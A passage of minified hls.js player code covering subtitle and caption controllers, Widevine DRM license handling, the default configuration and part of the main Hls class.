                                    o = this.unparsedVttFrags; if ("main" === t.type) { var l = t.sn;
                                    t.sn !== s + 1 && i && n && (i.reset(), n.reset()), this.lastSn = l } else if ("subtitle" === t.type)
                                    if (r.byteLength) { if (!Object(Ze.isFiniteNumber)(a[t.cc])) return o.push(e), void(a.length && this.hls.trigger($e.default.SUBTITLE_FRAG_PROCESSED, { success: !1, frag: t })); var u = t.decryptdata;
                                        null != u && null != u.key && "AES-128" === u.method || this._parseVTTs(t, r) } else this.hls.trigger($e.default.SUBTITLE_FRAG_PROCESSED, { success: !1, frag: t }) }, r._parseVTTs = function(e, t) { var r = this,
                                    i = this.hls,
                                    n = this.prevCC,
                                    a = this.textTracks,
                                    s = this.vttCCs;
                                s[e.cc] || (s[e.cc] = { start: e.start, prevCC: n, new: !0 }, this.prevCC = e.cc), ni.parse(t, this.initPTS[e.cc], s, e.cc, function(t) { if (r.config.renderTextTracksNatively) { var n = a[e.level]; if ("disabled" === n.mode) return void i.trigger($e.default.SUBTITLE_FRAG_PROCESSED, { success: !1, frag: e });
                                        t.forEach(function(e) { if (!n.cues.getCueById(e.id)) try { if (n.addCue(e), !n.cues.getCueById(e.id)) throw new Error("addCue is failed for: " + e) } catch (r) { et.logger.debug("Failed occurred on adding cues: " + r); var t = new window.TextTrackCue(e.startTime, e.endTime, e.text);
                                                t.id = e.id, n.addCue(t) } }) } else { var s = r.tracks[e.level].default ? "default" : "subtitles" + e.level;
                                        i.trigger($e.default.CUES_PARSED, { type: "subtitles", cues: t, track: s }) }
                                    i.trigger($e.default.SUBTITLE_FRAG_PROCESSED, { success: !0, frag: e }) }, function(t) { et.logger.log("Failed to parse VTT cue: " + t), i.trigger($e.default.SUBTITLE_FRAG_PROCESSED, { success: !1, frag: e }) }) }, r.onFragDecrypted = function(e) { var t = e.frag,
                                    r = e.payload; if ("subtitle" === t.type) { if (!Object(Ze.isFiniteNumber)(this.initPTS[t.cc])) return void this.unparsedVttFrags.push(e);
                                    this._parseVTTs(t, r) } }, r.onFragParsingUserdata = function(e) { var t = this.cea608Parser1,
                                    r = this.cea608Parser2; if (this.enabled && t && r)
                                    for (var i = 0; i < e.samples.length; i++) { var n = e.samples[i].bytes; if (n) { var a = this.extractCea608Data(n);
                                            t.addData(e.samples[i].pts, a[0]), r.addData(e.samples[i].pts, a[1]) } } }, r.extractCea608Data = function(e) { for (var t = 31 & e[0], r = 2, i = [
                                        [],
                                        []
                                    ], n = 0; n < t; n++) { var a = e[r++],
                                        s = 127 & e[r++],
                                        o = 127 & e[r++],
                                        l = 0 != (4 & a),
                                        u = 3 & a;
                                    0 === s && 0 === o || l && (0 !== u && 1 !== u || (i[u].push(s), i[u].push(o))) } return i }, t }(it),
                        si = ai,
                        oi = function(e) {
                            function t(t) { var r; return r = e.call(this, t, $e.default.MEDIA_ATTACHED, $e.default.MEDIA_DETACHING, $e.default.MANIFEST_LOADED, $e.default.SUBTITLE_TRACK_LOADED) || this, r.tracks = [], r.trackId = -1, r.media = null, r.stopped = !0, r.subtitleDisplay = !0, r.queuedDefaultTrack = null, r }
                            Ce(t, e); var r = t.prototype; return r.destroy = function() { it.prototype.destroy.call(this) }, r.onMediaAttached = function(e) { var t = this;
                                this.media = e.media, this.media && (Object(Ze.isFiniteNumber)(this.queuedDefaultTrack) && (this.subtitleTrack = this.queuedDefaultTrack, this.queuedDefaultTrack = null), this.trackChangeListener = this._onTextTracksChanged.bind(this), this.useTextTrackPolling = !(this.media.textTracks && "onchange" in this.media.textTracks), this.useTextTrackPolling ? this.subtitlePollingInterval = setInterval(function() { t.trackChangeListener() }, 500) : this.media.textTracks.addEventListener("change", this.trackChangeListener)) }, r.onMediaDetaching = function() { if (this.media) { this.useTextTrackPolling ? clearInterval(this.subtitlePollingInterval) : this.media.textTracks.removeEventListener("change", this.trackChangeListener), Object(Ze.isFiniteNumber)(this.subtitleTrack) && (this.queuedDefaultTrack = this.subtitleTrack);
                                    Ie(this.media.textTracks).forEach(function(e) { X(e) }), this.subtitleTrack = -1, this.media = null } }, r.onManifestLoaded = function(e) { var t = this,
                                    r = e.subtitles || [];
                                this.tracks = r, this.hls.trigger($e.default.SUBTITLE_TRACKS_UPDATED, { subtitleTracks: r }), r.forEach(function(e) { e.default && (t.media ? t.subtitleTrack = e.id : t.queuedDefaultTrack = e.id) }) }, r.onSubtitleTrackLoaded = function(e) { var t = this,
                                    r = e.id,
                                    i = e.details,
                                    n = this.trackId,
                                    a = this.tracks,
                                    s = a[n]; if (r >= a.length || r !== n || !s || this.stopped) return void this._clearReloadTimer(); if (et.logger.log("subtitle track " + r + " loaded"), i.live) { var o = R(s.details, i, e.stats.trequest);
                                    et.logger.log("Reloading live subtitle playlist in " + o + "ms"), this.timer = setTimeout(function() { t._loadCurrentTrack() }, o) } else this._clearReloadTimer() }, r.startLoad = function() { this.stopped = !1, this._loadCurrentTrack() }, r.stopLoad = function() { this.stopped = !0, this._clearReloadTimer() }, r._clearReloadTimer = function() { this.timer && (clearTimeout(this.timer), this.timer = null) }, r._loadCurrentTrack = function() { var e = this.trackId,
                                    t = this.tracks,
                                    r = this.hls,
                                    i = t[e];
                                e < 0 || !i || i.details && !i.details.live || (et.logger.log("Loading subtitle track " + e), r.trigger($e.default.SUBTITLE_TRACK_LOADING, { url: i.url, id: e })) }, r._toggleTrackModes = function(e) { var t = this.media,
                                    r = this.subtitleDisplay,
                                    i = this.trackId; if (t) { var n = Ie(t.textTracks); if (-1 === e)[].slice.call(n).forEach(function(e) { e.mode = "disabled" });
                                    else { var a = n[i];
                                        a && (a.mode = "disabled") } var s = n[e];
                                    s && (s.mode = r ? "showing" : "hidden") } }, r._setSubtitleTrackInternal = function(e) { var t = this.hls,
                                    r = this.tracks;!Object(Ze.isFiniteNumber)(e) || e < -1 || e >= r.length || (this.trackId = e, et.logger.log("Switching to subtitle track " + e), t.trigger($e.default.SUBTITLE_TRACK_SWITCH, { id: e }), this._loadCurrentTrack()) }, r._onTextTracksChanged = function() { if (this.media && this.hls.config.renderTextTracksNatively) { for (var e = -1, t = Ie(this.media.textTracks), r = 0; r < t.length; r++)
                                        if ("hidden" === t[r].mode) e = r;
                                        else if ("showing" === t[r].mode) { e = r; break }
                                    this.subtitleTrack = e } }, Le(t, [{ key: "subtitleTracks", get: function() { return this.tracks } }, { key: "subtitleTrack", get: function() { return this.trackId }, set: function(e) { this.trackId !== e && (this._toggleTrackModes(e), this._setSubtitleTrackInternal(e)) } }]), t }(it),
                        li = oi,
                        ui = r("./src/crypt/decrypter.js"),
                        ci = window,
                        di = ci.performance,
                        fi = function(e) {
                            function t(t, r) { var i; return i = e.call(this, t, $e.default.MEDIA_ATTACHED, $e.default.MEDIA_DETACHING, $e.default.ERROR, $e.default.KEY_LOADED, $e.default.FRAG_LOADED, $e.default.SUBTITLE_TRACKS_UPDATED, $e.default.SUBTITLE_TRACK_SWITCH, $e.default.SUBTITLE_TRACK_LOADED, $e.default.SUBTITLE_FRAG_PROCESSED, $e.default.LEVEL_UPDATED) || this, i.fragmentTracker = r, i.config = t.config, i.state = Yt.STOPPED, i.tracks = [], i.tracksBuffered = [], i.currentTrackId = -1, i.decrypter = new ui.default(t, t.config), i.lastAVStart = 0, i._onMediaSeeking = i.onMediaSeeking.bind(Oe(i)), i }
                            Me(t, e); var r = t.prototype; return r.startLoad = function() { this.stopLoad(), this.state = Yt.IDLE; var e = this.tracks[this.currentTrackId];
                                e && e.details && (this.setInterval(500), this.tick()) }, r.onSubtitleFragProcessed = function(e) { var t = e.frag,
                                    r = e.success; if (this.fragPrevious = t, this.state = Yt.IDLE, r) { var i = this.tracksBuffered[this.currentTrackId]; if (i) { for (var n, a = t.start, s = 0; s < i.length; s++)
                                            if (a >= i[s].start && a <= i[s].end) { n = i[s]; break }
                                        var o = t.start + t.duration;
                                        n ? n.end = o : (n = { start: a, end: o }, i.push(n)) } } }, r.onMediaAttached = function(e) { var t = e.media;
                                this.media = t, t.addEventListener("seeking", this._onMediaSeeking), this.state = Yt.IDLE }, r.onMediaDetaching = function() { var e = this;
                                this.media && (this.media.removeEventListener("seeking", this._onMediaSeeking), this.fragmentTracker.removeAllFragments(), this.currentTrackId = -1, this.tracks.forEach(function(t) { e.tracksBuffered[t.id] = [] }), this.media = null, this.state = Yt.STOPPED) }, r.onError = function(e) { var t = e.frag;
                                t && "subtitle" === t.type && (this.fragCurrent && this.fragCurrent.loader && this.fragCurrent.loader.abort(), this.state = Yt.IDLE) }, r.onSubtitleTracksUpdated = function(e) { var t = this;
                                et.logger.log("subtitle tracks updated"), this.tracksBuffered = [], this.tracks = e.subtitleTracks, this.tracks.forEach(function(e) { t.tracksBuffered[e.id] = [] }) }, r.onSubtitleTrackSwitch = function(e) { if (this.currentTrackId = e.id, !this.tracks || !this.tracks.length || -1 === this.currentTrackId) return void this.clearInterval(); var t = this.tracks[this.currentTrackId];
                                t && t.details && this.setInterval(500) }, r.onSubtitleTrackLoaded = function(e) { var t = e.id,
                                    r = e.details,
                                    i = this.currentTrackId,
                                    n = this.tracks,
                                    a = n[i];
                                t >= n.length || t !== i || !a || (r.live && T(a.details, r, this.lastAVStart), a.details = r, this.setInterval(500)) }, r.onKeyLoaded = function() { this.state === Yt.KEY_LOADING && (this.state = Yt.IDLE) }, r.onFragLoaded = function(e) { var t = this.fragCurrent,
                                    r = e.frag.decryptdata,
                                    i = e.frag,
                                    n = this.hls; if (this.state === Yt.FRAG_LOADING && t && "subtitle" === e.frag.type && t.sn === e.frag.sn && e.payload.byteLength > 0 && r && r.key && "AES-128" === r.method) { var a = di.now();
                                    this.decrypter.decrypt(e.payload, r.key.buffer, r.iv.buffer, function(e) { var t = di.now();
                                        n.trigger($e.default.FRAG_DECRYPTED, { frag: i, payload: e, stats: { tstart: a, tdecrypt: t } }) }) } }, r.onLevelUpdated = function(e) { var t = e.details,
                                    r = t.fragments;
                                this.lastAVStart = r.length ? r[0].start : 0 }, r.doTick = function() { if (!this.media) return void(this.state = Yt.IDLE); switch (this.state) {
                                    case Yt.IDLE:
                                        var e = this.config,
                                            t = this.currentTrackId,
                                            r = this.fragmentTracker,
                                            i = this.media,
                                            n = this.tracks; if (!n || !n[t] || !n[t].details) break; var a = e.maxBufferHole,
                                            s = e.maxFragLookUpTolerance,
                                            o = Math.min(e.maxBufferLength, e.maxMaxBufferLength),
                                            l = Mt.bufferedInfo(this._getBuffered(), i.currentTime, a),
                                            u = l.end,
                                            c = l.len,
                                            d = n[t].details,
                                            f = d.fragments,
                                            h = f.length,
                                            g = f[h - 1].start + f[h - 1].duration; if (c > o) return; var p, v = this.fragPrevious;
                                        u < g ? (v && d.hasProgramDateTime && (p = x(f, v.endProgramDateTime, s)), p || (p = N(v, f, u, s))) : p = f[h - 1], p && p.encrypted ? (et.logger.log("Loading key for " + p.sn), this.state = Yt.KEY_LOADING, this.hls.trigger($e.default.KEY_LOADING, { frag: p })) : p && r.getState(p) === Lt.NOT_LOADED && (this.fragCurrent = p, this.state = Yt.FRAG_LOADING, this.hls.trigger($e.default.FRAG_LOADING, { frag: p })) } }, r.stopLoad = function() { this.lastAVStart = 0, this.fragPrevious = null, e.prototype.stopLoad.call(this) }, r._getBuffered = function() { return this.tracksBuffered[this.currentTrackId] || [] }, r.onMediaSeeking = function() { if (this.fragCurrent) { var e = this.media ? this.media.currentTime : 0,
                                        t = this.config.maxFragLookUpTolerance,
                                        r = this.fragCurrent.start - t,
                                        i = this.fragCurrent.start + this.fragCurrent.duration + t;
                                    (e < r || e > i) && (this.fragCurrent.loader && this.fragCurrent.loader.abort(), this.fragmentTracker.removeFragment(this.fragCurrent), this.fragCurrent = null, this.fragPrevious = null, this.state = Yt.IDLE, this.tick()) } }, t }(Xt);! function(e) { e.WIDEVINE = "com.widevine.alpha", e.PLAYREADY = "com.microsoft.playready" }(Kr || (Kr = {})); var hi = function() { return "undefined" != typeof window && window.navigator && window.navigator.requestMediaKeySystemAccess ? window.navigator.requestMediaKeySystemAccess.bind(window.navigator) : null }(),
                        gi = function(e, t, r) { var i = { audioCapabilities: [], videoCapabilities: [] }; return e.forEach(function(e) { i.audioCapabilities.push({ contentType: 'audio/mp4; codecs="' + e + '"', robustness: r.audioRobustness || "" }) }), t.forEach(function(e) { i.videoCapabilities.push({ contentType: 'video/mp4; codecs="' + e + '"', robustness: r.videoRobustness || "" }) }), [i] },
                        pi = function(e, t, r, i) { switch (e) {
                                case Kr.WIDEVINE:
                                    return gi(t, r, i);
                                default:
                                    throw new Error("Unknown key-system: " + e) } },
                        vi = function(e) {
                            function t(t) { var r; return r = e.call(this, t, $e.default.MEDIA_ATTACHED, $e.default.MEDIA_DETACHED, $e.default.MANIFEST_PARSED) || this, r._widevineLicenseUrl = void 0, r._licenseXhrSetup = void 0, r._emeEnabled = void 0, r._requestMediaKeySystemAccess = void 0, r._drmSystemOptions = void 0, r._config = void 0, r._mediaKeysList = [], r._media = null, r._hasSetMediaKeys = !1, r._requestLicenseFailureCount = 0, r.mediaKeysPromise = null, r._onMediaEncrypted = function(e) { if (et.logger.log('Media is encrypted using "' + e.initDataType + '" init data type'), !r.mediaKeysPromise) return et.logger.error("Fatal: Media is encrypted but no CDM access or no keys have been requested"), void r.hls.trigger($e.default.ERROR, { type: Qe.ErrorTypes.KEY_SYSTEM_ERROR, details: Qe.ErrorDetails.KEY_SYSTEM_NO_KEYS, fatal: !0 }); var t = function(t) { r._media && (r._attemptSetMediaKeys(t), r._generateRequestWithPreferredKeySession(e.initDataType, e.initData)) };
                                    r.mediaKeysPromise.then(t).catch(t) }, r._config = t.config, r._widevineLicenseUrl = r._config.widevineLicenseUrl, r._licenseXhrSetup = r._config.licenseXhrSetup, r._emeEnabled = r._config.emeEnabled, r._requestMediaKeySystemAccess = r._config.requestMediaKeySystemAccessFunc, r._drmSystemOptions = t.config.drmSystemOptions, r }
                            Fe(t, e); var r = t.prototype; return r.getLicenseServerUrl = function(e) { switch (e) {
                                    case Kr.WIDEVINE:
                                        if (!this._widevineLicenseUrl) break; return this._widevineLicenseUrl } throw new Error('no license server URL configured for key-system "' + e + '"') }, r._attemptKeySystemAccess = function(e, t, r) { var i = this,
                                    n = pi(e, t, r, this._drmSystemOptions);
                                et.logger.log("Requesting encrypted media key-system access"); var a = this.requestMediaKeySystemAccess(e, n);
                                this.mediaKeysPromise = a.then(function(t) { return i._onMediaKeySystemAccessObtained(e, t) }), a.catch(function(t) { et.logger.error('Failed to obtain key-system "' + e + '" access:', t) }) }, r._onMediaKeySystemAccessObtained = function(e, t) { var r = this;
                                et.logger.log('Access for key-system "' + e + '" obtained'); var i = { mediaKeysSessionInitialized: !1, mediaKeySystemAccess: t, mediaKeySystemDomain: e };
                                this._mediaKeysList.push(i); var n = Promise.resolve().then(function() { return t.createMediaKeys() }).then(function(t) { return i.mediaKeys = t, et.logger.log('Media-keys created for key-system "' + e + '"'), r._onMediaKeysCreated(), t }); return n.catch(function(e) { et.logger.error("Failed to create media-keys:", e) }), n }, r._onMediaKeysCreated = function() { var e = this;
                                this._mediaKeysList.forEach(function(t) { t.mediaKeysSession || (t.mediaKeysSession = t.mediaKeys.createSession(), e._onNewMediaKeySession(t.mediaKeysSession)) }) }, r._onNewMediaKeySession = function(e) { var t = this;
                                et.logger.log("New key-system session " + e.sessionId), e.addEventListener("message", function(r) { t._onKeySessionMessage(e, r.message) }, !1) }, r._onKeySessionMessage = function(e, t) { et.logger.log("Got EME message event, creating license request"), this._requestLicense(t, function(t) { et.logger.log("Received license data (length: " + (t ? t.byteLength : t) + "), updating key-session"), e.update(t) }) }, r._attemptSetMediaKeys = function(e) { if (!this._media) throw new Error("Attempted to set mediaKeys without first attaching a media element"); if (!this._hasSetMediaKeys) { var t = this._mediaKeysList[0]; if (!t || !t.mediaKeys) return et.logger.error("Fatal: Media is encrypted but no CDM access or no keys have been obtained yet"), void this.hls.trigger($e.default.ERROR, { type: Qe.ErrorTypes.KEY_SYSTEM_ERROR, details: Qe.ErrorDetails.KEY_SYSTEM_NO_KEYS, fatal: !0 });
                                    et.logger.log("Setting keys for encrypted media"), this._media.setMediaKeys(t.mediaKeys), this._hasSetMediaKeys = !0 } }, r._generateRequestWithPreferredKeySession = function(e, t) { var r = this,
                                    i = this._mediaKeysList[0]; if (!i) return et.logger.error("Fatal: Media is encrypted but not any key-system access has been obtained yet"), void this.hls.trigger($e.default.ERROR, { type: Qe.ErrorTypes.KEY_SYSTEM_ERROR, details: Qe.ErrorDetails.KEY_SYSTEM_NO_ACCESS, fatal: !0 }); if (i.mediaKeysSessionInitialized) return void et.logger.warn("Key-Session already initialized but requested again"); var n = i.mediaKeysSession; return n ? t ? (et.logger.log('Generating key-session request for "' + e + '" init data type'), i.mediaKeysSessionInitialized = !0, void n.generateRequest(e, t).then(function() { et.logger.debug("Key-session generation succeeded") }).catch(function(e) { et.logger.error("Error generating key-session request:", e), r.hls.trigger($e.default.ERROR, { type: Qe.ErrorTypes.KEY_SYSTEM_ERROR, details: Qe.ErrorDetails.KEY_SYSTEM_NO_SESSION, fatal: !1 }) })) : (et.logger.warn("Fatal: initData required for generating a key session is null"), void this.hls.trigger($e.default.ERROR, { type: Qe.ErrorTypes.KEY_SYSTEM_ERROR, details: Qe.ErrorDetails.KEY_SYSTEM_NO_INIT_DATA, fatal: !0 })) : (et.logger.error("Fatal: Media is encrypted but no key-session existing"), void this.hls.trigger($e.default.ERROR, { type: Qe.ErrorTypes.KEY_SYSTEM_ERROR, details: Qe.ErrorDetails.KEY_SYSTEM_NO_SESSION, fatal: !0 })) }, r._createLicenseXhr = function(e, t, r) { var i = new XMLHttpRequest,
                                    n = this._licenseXhrSetup; try { if (n) try { n(i, e) } catch (t) { i.open("POST", e, !0), n(i, e) }
                                    i.readyState || i.open("POST", e, !0) } catch (e) { throw new Error("issue setting up KeySystem license XHR " + e) } return i.responseType = "arraybuffer", i.onreadystatechange = this._onLicenseRequestReadyStageChange.bind(this, i, e, t, r), i }, r._onLicenseRequestReadyStageChange = function(e, t, r, i) { switch (e.readyState) {
                                    case 4:
                                        if (200 === e.status) this._requestLicenseFailureCount = 0, et.logger.log("License request succeeded"), "arraybuffer" !== e.responseType && et.logger.warn("xhr response type was not set to the expected arraybuffer for license request"), i(e.response);
                                        else { if (et.logger.error("License Request XHR failed (" + t + "). Status: " + e.status + " (" + e.statusText + ")"), ++this._requestLicenseFailureCount > 3) return void this.hls.trigger($e.default.ERROR, { type: Qe.ErrorTypes.KEY_SYSTEM_ERROR, details: Qe.ErrorDetails.KEY_SYSTEM_LICENSE_REQUEST_FAILED, fatal: !0 }); var n = 3 - this._requestLicenseFailureCount + 1;
                                            et.logger.warn("Retrying license request, " + n + " attempts left"), this._requestLicense(r, i) } } }, r._generateLicenseRequestChallenge = function(e, t) { switch (e.mediaKeySystemDomain) {
                                    case Kr.WIDEVINE:
                                        return t } throw new Error("unsupported key-system: " + e.mediaKeySystemDomain) }, r._requestLicense = function(e, t) { et.logger.log("Requesting content license for key-system"); var r = this._mediaKeysList[0]; if (!r) return et.logger.error("Fatal error: Media is encrypted but no key-system access has been obtained yet"), void this.hls.trigger($e.default.ERROR, { type: Qe.ErrorTypes.KEY_SYSTEM_ERROR, details: Qe.ErrorDetails.KEY_SYSTEM_NO_ACCESS, fatal: !0 }); try { var i = this.getLicenseServerUrl(r.mediaKeySystemDomain),
                                        n = this._createLicenseXhr(i, e, t);
                                    et.logger.log("Sending license request to URL: " + i); var a = this._generateLicenseRequestChallenge(r, e);
                                    n.send(a) } catch (e) { et.logger.error("Failure requesting DRM license: " + e), this.hls.trigger($e.default.ERROR, { type: Qe.ErrorTypes.KEY_SYSTEM_ERROR, details: Qe.ErrorDetails.KEY_SYSTEM_LICENSE_REQUEST_FAILED, fatal: !0 }) } }, r.onMediaAttached = function(e) { if (this._emeEnabled) { var t = e.media;
                                    this._media = t, t.addEventListener("encrypted", this._onMediaEncrypted) } }, r.onMediaDetached = function() { var e = this._media,
                                    t = this._mediaKeysList;
                                e && (e.removeEventListener("encrypted", this._onMediaEncrypted), this._media = null, this._mediaKeysList = [], Promise.all(t.map(function(e) { if (e.mediaKeysSession) return e.mediaKeysSession.close().catch(function() {}) })).then(function() { return e.setMediaKeys(null) }).catch(function() {})) }, r.onManifestParsed = function(e) { if (this._emeEnabled) { var t = e.levels.map(function(e) { return e.audioCodec }),
                                        r = e.levels.map(function(e) { return e.videoCodec });
                                    this._attemptKeySystemAccess(Kr.WIDEVINE, t, r) } }, Ne(t, [{ key: "requestMediaKeySystemAccess", get: function() { if (!this._requestMediaKeySystemAccess) throw new Error("No requestMediaKeySystemAccess function configured"); return this._requestMediaKeySystemAccess } }]), t }(it),
                        mi = vi,
                        yi = Ue(Ue({ autoStartLoad: !0, startPosition: -1, defaultAudioCodec: void 0, debug: !1, capLevelOnFPSDrop: !1, capLevelToPlayerSize: !1, initialLiveManifestSize: 1, maxBufferLength: 70000, maxBufferSize: 6e9, maxBufferHole: 1, lowBufferWatchdogPeriod: .5, highBufferWatchdogPeriod: 3, nudgeOffset: .1, nudgeMaxRetry: 3, maxFragLookUpTolerance: .25, liveSyncDurationCount: 3, liveMaxLatencyDurationCount: 1 / 0, liveSyncDuration: void 0, liveMaxLatencyDuration: void 0, liveDurationInfinity: !1, liveBackBufferLength: 1 / 0, maxMaxBufferLength: 600, enableWorker: !0, enableSoftwareAES: !0, manifestLoadingTimeOut: 1e4, manifestLoadingMaxRetry: 1, manifestLoadingRetryDelay: 1e3, manifestLoadingMaxRetryTimeout: 64e3, startLevel: void 0, levelLoadingTimeOut: 1e4, levelLoadingMaxRetry: 4, levelLoadingRetryDelay: 1e3, levelLoadingMaxRetryTimeout: 64e3, fragLoadingTimeOut: 2e4, fragLoadingMaxRetry: 6, fragLoadingRetryDelay: 1e3, fragLoadingMaxRetryTimeout: 64e3, startFragPrefetch: !1, fpsDroppedMonitoringPeriod: 5e3, fpsDroppedMonitoringThreshold: .2, appendErrorMaxRetry: 3, loader: _r, fLoader: void 0, pLoader: void 0, xhrSetup: void 0, licenseXhrSetup: void 0, abrController: ur, bufferController: fr, capLevelController: gr, fpsController: yr, stretchShortVideoTrack: !1, maxAudioFramesDrift: 1, forceKeyFrameOnDiscontinuity: !0, abrEwmaFastLive: 3, abrEwmaSlowLive: 9, abrEwmaFastVoD: 3, abrEwmaSlowVoD: 9, abrEwmaDefaultEstimate: 5e5, abrBandWidthFactor: .95, abrBandWidthUpFactor: .7, abrMaxWithRealBitrate: !1, maxStarvationDelay: 4, maxLoadingDelay: 4, minAutoBitrate: 0, emeEnabled: !1, widevineLicenseUrl: void 0, drmSystemOptions: {}, requestMediaKeySystemAccessFunc: hi, testBandwidth: !0 }, function() { return { cueHandler: Ye, enableCEA708Captions: !0, enableWebVTT: !0, captionsTextTrack1Label: "English", captionsTextTrack1LanguageCode: "en", captionsTextTrack2Label: "Spanish", captionsTextTrack2LanguageCode: "es", captionsTextTrack3Label: "Unknown CC", captionsTextTrack3LanguageCode: "", captionsTextTrack4Label: "Unknown CC", captionsTextTrack4LanguageCode: "", renderTextTracksNatively: !0 } }()), {}, { subtitleStreamController: fi, subtitleTrackController: li, timelineController: si, audioStreamController: Rr, audioTrackController: Sr, emeController: mi }),
                        bi = function(e) {
                            function t(r) { var i;
                                void 0 === r && (r = {}), i = e.call(this) || this, i.config = void 0, i._autoLevelCapping = void 0, i.abrController = void 0, i.capLevelController = void 0, i.levelController = void 0, i.streamController = void 0, i.networkControllers = void 0, i.audioTrackController = void 0, i.subtitleTrackController = void 0, i.emeController = void 0, i.coreComponents = void 0, i.media = null, i.url = null; var n = t.DefaultConfig; if ((r.liveSyncDurationCount || r.liveMaxLatencyDurationCount) && (r.liveSyncDuration || r.liveMaxLatencyDuration)) throw new Error("Illegal hls.js config: don't mix up liveSyncDurationCount/liveMaxLatencyDurationCount and liveSyncDuration/liveMaxLatencyDuration");
                                i.config = Ke(Ke({}, n), r); var a = He(i),
                                    s = a.config; if (void 0 !== s.liveMaxLatencyDurationCount && s.liveMaxLatencyDurationCount <= s.liveSyncDurationCount) throw new Error('Illegal hls.js config: "liveMaxLatencyDurationCount" must be gt "liveSyncDurationCount"'); if (void 0 !== s.liveMaxLatencyDuration && (void 0 === s.liveSyncDuration || s.liveMaxLatencyDuration <= s.liveSyncDuration)) throw new Error('Illegal hls.js config: "liveMaxLatencyDuration" must be gt "liveSyncDuration"');
                                Object(et.enableLogs)(s.debug), i._autoLevelCapping = -1; var o = i.abrController = new s.abrController(He(i)),
                                    l = new s.bufferController(He(i)),
                                    u = i.capLevelController = new s.capLevelController(He(i)),
                                    c = new s.fpsController(He(i)),
                                    d = new At(He(i)),
                                    f = new Pt(He(i)),
                                    h = new Dt(He(i)),
                                    g = new tr(He(i)),
                                    p = i.levelController = new Zt(He(i)),
                                    v = new Ct(He(i)),
                                    m = i.streamController = new Qt(He(i), v),
                                    y = [p, m],
                                    b = s.audioStreamController;
                                b && y.push(new b(He(i), v)), i.networkControllers = y; var _ = [d, f, h, o, l, u, c, g, v]; if (b = s.audioTrackController) { var E = new b(He(i));
                                    i.audioTrackController = E, _.push(E) } if (b = s.subtitleTrackController) { var S = new b(He(i));
                                    i.subtitleTrackController = S, y.push(S) } if (b = s.emeController) { var T = new b(He(i));
                                    i.emeController = T, _.push(T) } return b = s.subtitleStreamController, b && y.push(new b(He(i), v)), b = s.timelineController, b && _.push(new b(He(i))), i.coreComponents = _, i }
                            ze(t, e), t.isSupported = function() { return Z() }, We(t, null, [{ key: "version", get: function() { return "0.14.17" } }, { key: "Events", get: function() { return $e.default } }, { key: "ErrorTypes", get: function() { return Qe.ErrorTypes } }, { key: "ErrorDetails", get: function() { return Qe.ErrorDetails } }, { key: "DefaultConfig", get: function() { return t.defaultConfig ? t.defaultConfig : yi }, set: function(e) { t.defaultConfig = e } }]); var r = t.prototype; return r.destroy = function() { et.logger.log("destroy"), this.trigger($e.default.DESTROYING), this.detachMedia(), this.coreComponents.concat(this.networkControllers).forEach(function(e) { e.destroy() }), this.url = null, this.removeAllListeners(), this._autoLevelCapping = -1 }, r.attachMedia = function(e) { et.logger.log("attachMedia"), this.media = e, this.trigger($e.default.MEDIA_ATTACHING, { media: e }) }, r.detachMedia = function() { et.logger.log("detachMedia"), this.trigger($e.default.MEDIA_DETACHING), this.media = null }, r.loadSource = function(e) { e = Je.buildAbsoluteURL(window.location.href, e, { alwaysNormalize: !0 }), et.logger.log("loadSource:" + e), this.url = e, this.trigger($e.default.MANIFEST_LOADING, { url: e }) }, r.startLoad = function(e) { void 0 === e && (e = -1), et.logger.log("startLoad(" + e + ")"), this.networkControllers.forEach(function(t) { t.startLoad(e) }) }, r.stopLoad = function() { et.logger.log("stopLoad"), this.networkControllers.forEach(function(e) { e.stopLoad() }) }, r.swapAudioCodec = function() { et.logger.log("swapAudioCodec"), this.streamController.swapAudioCodec() }, r.recoverMediaError = function() { et.logger.log("recoverMediaError"); var e = this.media;
                                this.detachMedia(), e && this.attachMedia(e) }, r.removeLevel = function(e, t) { void 0 === t && (t = 0), this.levelController.removeLevel(e, t) }, We(t, [{ key: "levels", get: function() { return this.levelController.levels } }, { key: "currentLevel", get: function() { return this.streamController.currentLevel }, set: function(e) { et.logger.log("set currentLevel:" + e), this.loadLevel = e, this.streamController.immediateLevelSwitch() } }, { key: "nextLevel", get: function() { return this.streamController.nextLevel }, set: function(e) { et.logger.log("set nextLevel:" + e), this.levelController.manualLevel = e, this.streamController.nextLevelSwitch() } }, { key: "loadLevel", get: function() { return this.levelController.level }, set: function(e) { et.logger.log("set loadLevel:" + e), this.levelController.manualLevel = e } }, { key: "nextLoadLevel", get: function() { return this.levelController.nextLoadLevel }, set: function(e) { this.levelController.nextLoadLevel = e } }, { key: "firstLevel", get: function() { return Math.max(this.levelController.firstLevel, this.minAutoLevel) }, set: function(e) { et.logger.log("set firstLevel:" + e), this.levelController.firstLevel = e } }, { key: "startLevel", get: function() { return this.levelController.startLevel }, set: function(e) { et.logger.log("set startLevel:" + e), -1 !== e && (e = Math.max(e, this.minAutoLevel)), this.levelController.startLevel = e } }, { key: "capLevelToPlayerSize", set: function(e) { var t = !!e;
                                    t !== this.config.capLevelToPlayerSize && (t ? this.capLevelController.startCapping() : (this.capLevelController.stopCapping(), this.autoLevelCapping = -1, this.streamController.nextLevelSwitch()), this.config.capLevelToPlayerSize = t) } }, { key: "autoLevelCapping", get: function() { return this._autoLevelCapping }, set: function(e) { et.logger.log("set autoLevelCapping:" + e), this._autoLevelCapping = e } }, { key: "bandwidthEstimate", get: function() { var e = this.abrController._bwEstimator; return e ? e.getEstimate() : NaN } }, { key: "autoLevelEnabled", get: function() { return -1 === this.levelController.manualLevel } }, { key: "manualLevel", get: function() { return this.levelController.manualLevel } }, { key: "minAutoLevel", get: function() { for (var e = this.levels, t = this.config.minAutoBitrate, r = e ? e.length : 0, i = 0; i < r; i++) { if ((e[i].realBitrate ? Math.max(e[i].realBitrate, e[i].bitrate) : e[i].bitrate) > t) return i } return 0 } }, { key: "maxAutoLevel", get: function() { var e = this.levels,
                                        t = this.autoLevelCapping; return -1 === t && e && e.length ? e.length - 1 : t } }, { key: "nextAutoLevel", get: function() { return Math.min(Math.max(this.abrController.nextAutoLevel, this.minAutoLevel), this.maxAutoLevel) }, set: function(e) { this.abrController.nextAutoLevel = Math.max(this.minAutoLevel, e) } }, { key: "audioTracks", get: function() { var e = this.audioTrackController; return e ? e.audioTracks : [] } }, { key: "audioTrack", get: function() { var e = this.audioTrackController; return e ? e.audioTrack : -1 }, set: function(e) { var t = this.audioTrackController;
